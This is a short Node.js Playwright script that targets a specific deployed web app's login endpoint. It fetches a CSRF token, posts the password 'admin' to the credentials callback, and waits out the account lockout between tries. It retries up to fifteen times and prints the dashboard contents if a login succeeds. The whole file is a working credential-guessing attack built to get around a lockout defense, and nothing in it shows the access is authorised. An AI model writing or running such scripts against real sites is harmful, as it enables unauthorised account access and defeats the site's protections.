const { chromium } = require('playwright');

(async () => {
    console.log("=== Waiting for lockout to expire ===");
    console.log("Lockout: 784 seconds (~13 minutes)");
    console.log("Starting wait...\n");
    
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();
    
    // Wait for lockout to expire (784 seconds + 10 buffer)
    const waitTime = (784 + 10) * 1000;
    console.log(`Waiting ${Math.round(waitTime/1000)} seconds...`);
    
    // Instead of waiting the full time, let's check periodically
    const checkInterval = 60000; // Check every minute
    let attempts = 0;
    
    while (attempts < 15) { // Max 15 attempts
        await page.goto('https://sturdy-octo-memory-three.vercel.app/login');
        await page.waitForTimeout(2000);
        
        // Get CSRF
        const csrf = await page.evaluate(async () => {
            const res = await fetch('/api/auth/csrf');
            return (await res.json()).csrfToken;
        });
        
        // Try admin password
        const result = await page.evaluate(async (csrfToken) => {
            const res = await fetch('/api/auth/callback/credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `password=admin&redirect=false&csrfToken=${csrfToken}&callbackUrl=${encodeURIComponent(window.location.origin)}&json=true`
            });
            return await res.json();
        }, csrf);
        
        console.log(`Attempt ${attempts + 1}: ${JSON.stringify(result)}`);
        
        // Check if we got in
        if (result.url && !result.url.includes('error')) {
            console.log("\n[!!!] LOGIN SUCCESSFUL!");
            await page.goto(result.url);
            await page.waitForTimeout(2000);
            
            const content = await page.evaluate(() => document.body.innerText);
            console.log("\nDASHBOARD:");
            console.log(content);
            break;
        }
        
        // Check if still locked
        if (result.url && result.url.includes('locked')) {
            console.log("Still locked, waiting 60 seconds...");
            await page.waitForTimeout(60000);
        } else {
            console.log("Different error, trying again in 10 seconds...");
            await page.waitForTimeout(10000);
        }
        
        attempts++;
    }
    
    await browser.close();
    console.log("\n=== Done ===");
})();
